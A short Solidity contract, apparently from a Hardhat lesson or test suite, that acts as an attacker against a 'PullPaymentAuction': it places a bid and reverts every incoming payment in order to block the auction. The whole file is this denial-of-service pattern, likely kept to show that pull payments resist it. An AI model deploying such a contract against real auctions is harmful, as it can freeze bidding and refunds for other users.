//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./PullPaymentAuction.sol";

contract PullPaymentAuctionBlockerAttacker {
    PullPaymentAuction auction;

    constructor(address auctionAddress) {
        auction = PullPaymentAuction(auctionAddress);
    }

    receive() external payable {
        revert("Bahahaha! Attacker has blocked the auction!");
    }

    function blockAuction() external payable {
        auction.bid{value: msg.value}();
    }
}
